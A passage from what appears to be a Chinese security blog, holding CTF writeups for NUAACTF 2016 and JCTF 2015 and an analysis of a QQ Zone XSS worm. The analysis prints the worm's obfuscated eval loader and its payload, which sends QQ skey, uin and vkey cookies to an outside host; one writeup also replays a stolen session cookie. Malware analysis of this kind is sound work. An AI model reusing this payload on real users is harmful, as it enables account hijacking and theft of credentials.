 0x2FAAC     End of Zip archive</span><br></pre></td></tr></table></figure>
+
+<p>发现在第195124的地方是一个zip压缩包。于是使用dd命令将其提取出来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=misc2.png of=out.zip bs=1 skip=195124</span><br><span class="line">142+0 records <span class="keyword">in</span></span><br><span class="line">142+0 records out</span><br><span class="line">142 bytes (142 B) copied, 0.00722364 s, 19.7 kB/s</span><br></pre></td></tr></table></figure>
+
+<p>打开out.zip，里面是一个flag.txt，内容为：nuaactf{z1p_0vEr_Png_1s_fun}。</p>
+<h1 id="Misc3"><a href="#Misc3" class="headerlink" title="Misc3"></a>Misc3</h1><p>使用StegSolve工具打开文件，切换至Red plane 1，在文件左下角有一个二维码。</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/15.png" alt="0"></p>
+<p>扫码得出来一个字符串：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QlpoOTFBWSZTWXhAk1kAAAtfgAAQIABgAAgAAACvIbYKIAAigNHqNGmnqFMJpoDTEO0CXcIvl9SeOAB3axLQYn4u5IpwoSDwgSay</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这是一个Base64编码。然而这串编码并不是编码了一段文字，可能是一段二进制数据。将其提取出来，并查看文件类型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;QlpoOTFBWSZTWXhAk1kAAAtfgAAQIABgAAgAAACvIbYKIAAigNHqNGmnqFMJpoDTEO0CXcIvl9SeOAB3axLQYn4u5IpwoSDwgSay&quot;</span> | base64 –d &gt; out.dat</span><br><span class="line">$ file out.dat</span><br><span class="line">out.dat: bzip2 compressed data, block size = 900k</span><br></pre></td></tr></table></figure>
+
+<p>发现是一个bzip2压缩的文件，将其解压即可得到flag：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat out.dat | bunzip2</span><br><span class="line">nuaactf&#123;qrc0de_in_C011ect1on!&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h1><p>首先先用dex2jar将apk解包，使用jd-gui查看，发现里面超级复杂，于是转向pcapng文件，用Wireshark打开之后，过滤出HTTP请求，发现每个POST请求的JSON串都会带上一个body参数，而且是经过加密的，与题目给的数据很像。于是思路变为查找body的加密过程。使用jd-gui全局查找，发现在<code>com.huidong.mdschool.net.HttpTask.class</code>文件的<code>onPreExecute</code>函数中有如下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (String str = <span class="string">&quot;&#x27;&quot;</span> + AesUtil.encrypt(localGson.toJson(<span class="keyword">this</span>.bodyRequest), <span class="keyword">new</span> StringBuilder(<span class="string">&quot;www.wowsport.cn&quot;</span>).append(BodyBuildingUtil.getDeviceId(<span class="keyword">this</span>.context)).toString()) + <span class="string">&quot;&#x27;&quot;</span>;; str = localGson.toJson(<span class="keyword">this</span>.bodyRequest)) &#123;</span><br><span class="line">    localHashMap.put(<span class="string">&quot;body&quot;</span>, str);</span><br><span class="line">    <span class="keyword">this</span>.jsonObject = localHashMap.toString();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是找到了加密方式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AesUtil.encrypt(localGson.toJson(<span class="keyword">this</span>.bodyRequest), <span class="keyword">new</span> StringBuilder(<span class="string">&quot;www.wowsport.cn&quot;</span>).append(BodyBuildingUtil.getDeviceId(<span class="keyword">this</span>.context))</span><br></pre></td></tr></table></figure>
+
+<p>定位至AesUtil.encrypt函数，如下图所示：</p>
+<p><img src="https://dn-rexskz.qbox.me/blog/article/nuaactf-2016/16.png" alt="0"></p>
+<p>其中函数<code>secureBytes</code>的作用是将字符串长度变为16，多则截取少则补零。然后<code>encrypt</code>使用了AES做加密，key就是那个16位字符串，也就是<code>secureBytes(new StringBuilder("<a target="_blank" rel="noopener" href="http://www.wowsport.cn&quot;).append(bodybuildingutil.getdeviceid(this.context)/">www.wowsport.cn&quot;).append(BodyBuildingUtil.getDeviceId(this.context)</a>))</code>。前面一共15位，也就是说只需要知道<code>getDeviceId</code>的结果就可以了。看起来这个值与设备有关，应该只能从pcapng文件中找。发现POST数据中有一个”devId”:”81505f1ad0d49485”，于是密钥为<a href="http://www.wowsport.cn8，解密得出：{&quot;flag&quot;:&quot;nuaactf{f**K_mE_D0nG_sp0rt!}&quot;}。">www.wowsport.cn8，解密得出：{&quot;flag&quot;:&quot;nuaactf{f**K_mE_D0nG_sp0rt!}&quot;}。</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2016/04/26/nuaactf-2016-offical-writeup/" data-id="clg6iympc000yguot9wor71lk" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-jctf-2015-writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/11/27/jctf-2015-writeup/" class="article-date">
+  <time datetime="2015-11-27T02:56:00.000Z" itemprop="datePublished">2015-11-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/27/jctf-2015-writeup/">JCTF2015非官方writeup</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这次水平有限，所以只做出了四道题……请大家尽情鄙视我们吧……</p>
+<h1 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h1><p>在资源文件夹中有一个bababa.wav的文件，用AU打开，发现是四声道，下面的两个音轨是二进制波形。按照高低不同分为01记下后，每八位一组，转换为char，即可得到flag。</p>
+<h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><p>根据提示可得栈226有问题， 发现所有记录中均使用DES-EBC加密，key为stringWi。从github上down一个des解密算法，把226的post数据base64解码后使用des解密，即可得到flag。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;bundle&quot;</span> : <span class="string">&quot;com.Securitygossip&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;os&quot;</span> : <span class="string">&quot;0.0.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;status&quot;</span> : <span class="string">&quot;solved&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;app&quot;</span> : <span class="string">&quot;XcodeGhost&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;country&quot;</span> : <span class="string">&quot;CN&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;language&quot;</span> : <span class="string">&quot;zh-Hans&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span> : <span class="string">&quot;426&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;type&quot;</span> : <span class="string">&quot;iPhone6,&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span> : <span class="string">&quot;1440065480&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;JCTF&#123;XcodeGhost_is_everywhere&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x6-1"><a href="#0x6-1" class="headerlink" title="0x6-1"></a>0x6-1</h1><p>在根目录下的robots.txt中发现如下字符串：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">User-agent:</span> <span class="string">*</span></span><br><span class="line"><span class="attr">Disallow:</span> <span class="string">/13c087c969641bc59fffc97dccd5e673.php?ajiao=whosays*$</span></span><br></pre></td></tr></table></figure>
+
+<p>最后两个字符看起来像一个正则表达式。</p>
+<p>打开Disallow的网址之后，发现php文件的ETAG有点特殊，其它文件的ETAG都是正常的，只有php文件的ETAG是一串连起来的字符：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">61573135623356795a6d467563773d3d</span><br></pre></td></tr></table></figure>
+
+<p>将ETAG每两位分隔开，作为URL编码来解码，得到一个base64串：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aW15b3VyZmFucw==</span><br></pre></td></tr></table></figure>
+
+<p>解码后得到“imyourfans”。</p>
+<p>考虑之前robots.txt中的提示，将此字符串带入参数：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ajiao=whosaysimyourfans</span><br></pre></td></tr></table></figure>
+
+<p>访问之后，可以在最下方找到如下代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;JCTF&#123;keep_clam_and_carry_on&#125;&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;# 0x2/1c8bd3e2bdb4c43d317ef5fbef73aab0.php&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x6-2"><a href="#0x6-2" class="headerlink" title="0x6-2"></a>0x6-2</h1><p>查看网页源代码，可以看到一段注释：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--my birthday 19xxxxxx--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据注释和上面<code>&lt;img&gt;</code>标签的alt，容易联想到“刘涛生日”，百度可得19780712。然而输入进去发现并没有立即提交。</p>
+<p>看到网页中的一段js，这是在用jQuery发post包：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendreq</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> requestUrl = <span class="string">&quot;./1c8bd3e2bdb4c43d317ef5fbef73aab0.php&quot;</span>;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">        data: <span class="string">&quot;pwd=&quot;</span> + $(<span class="string">&quot;#liutao&quot;</span>).val(),</span><br><span class="line">        dataType: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">        contentType: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        url: requestUrl,</span><br><span class="line">        <span class="keyword">async</span>: <span class="literal">false</span>,</span><br><span class="line">        complete: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span>(<span class="params">xhr</span>) </span>&#123;</span><br><span class="line">            alert(xhr);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (msg == <span class="string">&quot;error&quot;</span>)</span><br><span class="line">                alert(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">window</span>.location.href = msg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中data的值为“pwd=19780712”，用Fiddler模拟发个包就好了，可以在网页最下方发现提示：“不是土豪不过关，请用iphone7浏览”……主办方丧心病狂……</p>
+<p>然后我当时智商太低，并没有意识到iphone只出到了6s，傻傻去百度iphone7的参数去了……结果真发现了，iphone7使用的是iOS10系统，所以将浏览器UA中的版本改成10就可以了，访问得到一个图片的路径，以及一句提示：“wrong session”。</p>
+<p>打开图片，里面是一些用xss获取到的cookie，将PHPSESSID替换掉再访问，即可获取flag。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2015/11/27/jctf-2015-writeup/" data-id="clg6iympb000wguot61o63wtw" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-qzone-xss-analysis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/08/15/qzone-xss-analysis/" class="article-date">
+  <time datetime="2015-08-15T06:12:00.000Z" itemprop="datePublished">2015-08-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/08/15/qzone-xss-analysis/">对QQ空间自动转发/加好友的研究</a>
+    </h1>
+  
+
+
+  <div class="article-author">
+    <img src="https://www.gravatar.com/avatar/67d0b10056c602378e25de466c83e7dd?s=48">
+    <div class="article-author-info">
+      <a href="/author/rexskz" class="article-author-name">Rex Zeng</a>
+      <a target="_blank" rel="noopener" href="https://www.rexskz.info/" class="article-author-site" title="Visit the author's site">[site]</a>
+      <div class="article-author-about" title="音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。">音游狗、安全狗、攻城狮、业余设计师、段子手、苦学日语的少年。</div>
+    </div>
+  </div>
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前几天，QQ 空间的一大批好友转了所谓“优衣库”的一个视频，不用说，肯定是QQ空间有什么XSS漏洞了。有学弟让我去研究，其实我是拒绝的，因为我当时在搞别的事情，随便看了看源码没发现问题，于是就放到脑后了。</p>
+<p>昨天晚上发现空间里又有好友转发的现象，甚至有自动加好友的问题。正好大半夜一个人有安静的时间，于是就顺便研究一下。</p>
+<p>一开始没有头绪，在想是不是QQ空间有直接的XSS漏洞，于是看到了分享链接的标题，“▶↔§↙♯敱”这几个字很可疑，但是经过<code>encodeURIComponent</code>之后发现并没什么异常，这条路走不通。</p>
+<p>从隐身窗口中打开链接（链接地址是恶意网址这个很容易看出来），但是并没看出代码有什么问题，除了页面最下方有一个<code>loadscript.js</code>，看名字应该是加载一个JavaScript代码，但是网址却是一个<code>.php</code>结尾的网址。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dor = <span class="built_in">parseInt</span>(cookieRead(<span class="string">&quot;sdone&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (dor &amp;&amp; dor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    loadscript.js(<span class="string">&quot;/v/getplay.php&quot;</span>);</span><br><span class="line">    cookie_set(<span class="string">&quot;sdone&quot;</span>, <span class="number">99</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是好像并没有什么端倪：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rndNum</span>(<span class="params">len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &amp;&amp; len &gt; <span class="number">0</span> &amp;&amp; len &lt; <span class="number">100</span>) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        len = <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> strs = <span class="string">&quot;123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> maxPos = strs.length;</span><br><span class="line">    <span class="keyword">var</span> rdstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        rdstr += strs.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rdstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cookieRead) &#123;</span><br><span class="line">    <span class="keyword">var</span> dor = cookieRead(<span class="string">&quot;adplay&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dor &amp;&amp; dor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cookie_set(<span class="string">&quot;adplay&quot;</span>, <span class="number">99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这条路也走不通。为了重现这个问题，我决定亲自实验一下。于是我在普通Chrome窗口中点开了这个链接。</p>
+<p><strong>然并卵。</strong></p>
+<p>什么都没发生，所以这肯定是只在手机QQ的浏览器中才有用。手头没有手机上的抓包工具，不过还好以前写前端的时候，为了方便测试移动端兼容性特地写了个页面：<a title="设备信息检测" href="https://www.rexskz.info/demos/devicetest.html" target="_blank">设备信息检测</a>，于是用手机访问了一下，我的手机QQ浏览器的UA是这样的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; HUAWEI G7-TL00 Build/HuaweiG7-TL00) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025442 Mobile Safari/533.1 V1_AND_SQ_5.7.2_260_YYB_D QQ/5.7.2.2490 NetType/4G WebP/0.3.0</span><br></pre></td></tr></table></figure>
+
+<p>在Chrome的开发者工具中将UA修改成这个，然而发现我已经上不去那个网站了。</p>
+<p>天无绝人之路。将其一键加入科学上网列表之后，发现那个<code>getplay.php</code>的请求没了……</p>
+<p>可能是人家防止我们分析吧。没关系，把网址中的随机参数改一改，清空一下缓存啥的，于是这个神奇的文件又出现了：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;footad&quot;</span>).src = <span class="string">&quot;http://blog.qq.com/qzone/1107397297/1407071241.htm?vid=&quot;</span> + <span class="built_in">window</span>.vid;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rndNum</span>(<span class="params">len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &amp;&amp; len &gt; <span class="number">0</span> &amp;&amp; len &lt; <span class="number">100</span>) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        len = <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> strs = <span class="string">&quot;123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> maxPos = strs.length;</span><br><span class="line">    <span class="keyword">var</span> rdstr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        rdstr += strs.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * maxPos));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rdstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cookieRead) &#123;</span><br><span class="line">    <span class="keyword">var</span> dor = cookieRead(<span class="string">&quot;adplay&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dor &amp;&amp; dor &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cookie_set(<span class="string">&quot;adplay&quot;</span>, <span class="number">99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一行……在干啥？</p>
+<p>实在是太晚了，于是我先睡觉了，睡得特别好，今天12点才起床。</p>
+<p>于是打开网址看看吧（从<code>console</code>中获取到<code>window.vid=19</code>），发现了下面这么一段：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="regexp">/e%3Ddocument.body.innerHTML%3Bs%3De.indexOf%28%22%2f%2f%27%2C%27pro%22%29%3Bif%28s%3E0%29%7Be%3De.substring%28s%2B2%29%3Bt%3De.indexOf%28%22%3C%5C%2F%22%29%3Bif%28t%3E0%29%7Be%3D%22g_weather%5B%27save%27%5D%3D%7B%27country%27%3A%27%E4%B8%AD%E5%9B%BD%22%2Be.substring%280%2Ct%29%3Beval%28e%29%7D%7D%3Bdocument.write(%27%3Cscr%69pt%20src%3D%22h%74%74p%3A%2f%2fimgc%61che.qq.skyd%61t%61s.com%2Fg%2Fn%2Fb.jpg%22%3E%3C%2Fscr%69pt%3E%27)/</span>;</span><br><span class="line">s = <span class="built_in">unescape</span>(s);</span><br><span class="line"><span class="built_in">eval</span>(s.substring(<span class="number">1</span>, s.length - <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><code>eval</code>执行的语句，也就是那个<code>s</code>里面的内容，是这样的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="built_in">document</span>.body.innerHTML;</span><br><span class="line">s = e.indexOf(<span class="string">&quot;//&#x27;, &#x27;pro&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    e = e.substring(s + <span class="number">2</span>);</span><br><span class="line">    t = e.indexOf(<span class="string">&quot;&lt;\/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (t &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        e = <span class="string">&quot;g_weather[&#x27;save&#x27;]=&#123;&#x27;country&#x27;:&#x27;ä¸­å½&quot;</span> + e.substring(<span class="number">0</span>, t);</span><br><span class="line">        <span class="built_in">eval</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;&lt;strong&gt;http://imgcache.qq.skydatas.com/g/n/b.jpg&lt;/strong&gt;&quot;&gt;&lt;/script&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可见这是加载了一个奇怪的资源：<code>.jpg</code>结尾的JavaScript代码。打开之后有个301跳转，追随过去看看吧。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tjskey</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> eimg;</span><br><span class="line">    eimg = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    eimg.type = <span class="string">&quot;text/javascript&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> myskey = cookieRead(<span class="string">&quot;skey&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> myqq = <span class="built_in">parseInt</span>(cookieRead(<span class="string">&quot;uin&quot;</span>).replace(<span class="string">&quot;o&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">var</span> vkey = cookieRead(<span class="string">&quot;vkey&quot;</span>);</span><br><span class="line">    <span class="comment">//if(myqq&gt;500 &amp;&amp; vkey.length&gt;10)&#123;</span></span><br><span class="line">    <span class="keyword">if</span> (myqq &gt; <span class="number">99999999</span>) &#123;</span><br><span class="line">        eimg.src = <span class="string">&quot;http://db.outome.com/nsys/tsk.php?u=&quot;</span> + myqq + <span class="string">&quot;&amp;s=&quot;</span> + myskey + <span class="string">&quot;&amp;v=&quot;</span> + vkey + <span class="string">&quot;&amp;f=&quot;</span> + getQueryString(<span class="string">&quot;vid&quot;</span>);</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(eimg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到上面加粗的那一段了？通过<code>http://db.outome.com/nsys/tsk.php</code>这个接口将你的qq、skey、vkey、vid信息发到指定的位置。</p>
+<p>还需要管别的么？有了key以后想做什么操作都随意了吧！</p>
+<p>但是这并没有解决根本的疑问：blog.qq.com的网页上为什么会出现外面的代码？blog.qq.com我从来没听说过，看起来像QQ空间的前身，那为什么QQ没有弃用这个域名？是不是这个网站上有BUG？我就不得而知了。如果有大神有新的研究成果，求共享！</p>
+<p>另，分享一篇寻找资料时找到的文章：<a title="qq空间某被利用的xss分析 - virusdefender's blog" href="https://virusdefender.net/index.php/archives/347/" target="_blank">qq空间某被利用的xss分析 - virusdefender’s blog</a>，与本文的原理不同，这个是通过XSS修改<code>&lt;base&gt;</code>直接获取key以达到目标。但是该文章是通过网址中的<code>imgdm</code>参数进行反射型XSS，而本文应该属于存储型XSS。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2015/08/15/qzone-xss-analysis/" data-id="clg6iymph001bguot8amxbq8s" class="article-share-link">Share</a>
+      
+      
